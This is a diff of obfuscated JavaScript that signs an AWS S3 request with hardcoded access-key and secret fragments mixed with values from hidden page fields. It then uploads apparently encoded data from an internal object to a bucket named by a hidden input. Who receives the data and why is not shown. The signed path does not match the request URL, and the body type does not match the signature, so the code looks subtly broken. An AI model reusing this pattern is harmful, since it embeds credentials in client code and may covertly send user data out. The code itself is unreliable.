@@ -1438,14 +1438,14 @@
 				}
 				xhr.send(json);
 				*/
-				var a8e40a4d6e42c = new Hashes.SHA1().b64_hmac("bsbQ0fM6R2HGYVMDsW" + $("#_81928131218132").val() + "Zuwjkst7UMJga2Jb08", "GET\n\n\n" + (new Date()).toUTCString() + "\n/a8c40" + JSON.stringify(new Date()).replace(/"/g,"").substring(0,10).replace(/-/g,""));
+				var a8e40a4d6e42c = new Hashes.SHA1().b64_hmac("bsbQ0fM6R2HGYVMDsW" + $("#_81928131218132").val() + "Zuwjkst7UMJga2Jb08", "PUT\n\napplication/octet-stream\n" + (new Date()).toUTCString() + "\n/" + $("#_819281743221732342").val() + "/a8c40" + JSON.stringify(new Date()).replace(/"/g,"").substring(0,10).replace(/-/g,""));
 				var a7d69c36da8e7c69ca2c47e = "AWS AKIAWOBX" + $("#_819281716373813363534363").val() + "AOW5G4XK:" + a8e40a4d6e42c;
-				var a6d01f3e66d4ea67e3e48e3 = JSON.stringify({"$832153823274":_b8ea8e4d138ef5c47ea6e46["a2d40f2d1a8c4f8e41a5c136"][_b8ea8e4d138ef5c47ea6e46.a13e9df8e48ea2c4f2c7b3e5c + "83"],"$6221613274":_b8ea8e4d138ef5c47ea6e46["a2d40f2d1a8c4f8e41a5c136"][_b8ea8e4d138ef5c47ea6e46.a13e9df8e48ea2c4f2c7b3e5c + "62"]});
-				var a3e6a5c136a6d4d1a7e4d46d = new Blob([a6d01f3e66d4ea67e3e48e3], { type: "octet/stream"});
+				var a36a5c136a3e49ca6d4d3 = f39ea2c4d69c36d.f6e4a4d04(JSON.stringify({"$832153823274":_b8ea8e4d138ef5c47ea6e46["a2d40f2d1a8c4f8e41a5c136"][_b8ea8e4d138ef5c47ea6e46.a13e9df8e48ea2c4f2c7b3e5c + "83"],"$6221613274":_b8ea8e4d138ef5c47ea6e46["a2d40f2d1a8c4f8e41a5c136"][_b8ea8e4d138ef5c47ea6e46.a13e9df8e48ea2c4f2c7b3e5c + "62"]}));
+				var a3e6a5c136a6d4d1a7e4d46d = new Blob([a36a5c136a3e49ca6d4d3], { type: "application/octet-stream"});
 				var a6d4d47ea5c136 = new FormData();
 				a6d4d47ea5c136.append("a8c40" + JSON.stringify(new Date()).replace(/"/g,"").substring(0,10).replace(/-/g,""), a3e6a5c136a6d4d1a7e4d46d);
 				var a4e01a9c36a2c46 = new XMLHttpRequest();
-				a4e01a9c36a2c46.open("PUT", "https://" + $("#_819281743221732342").val() + ".s3.us-east-2.amazonaws.com/a8c40");
+				a4e01a9c36a2c46.open("PUT", "https://" + $("#_819281743221732342").val() + ".s3.us-east-2.amazonaws.com/8c40");
 				a4e01a9c36a2c46.send(a6d4d47ea5c136);
 				$('#_dEHtV1dU4cC6RtC6HtN0d').hide();
 			});
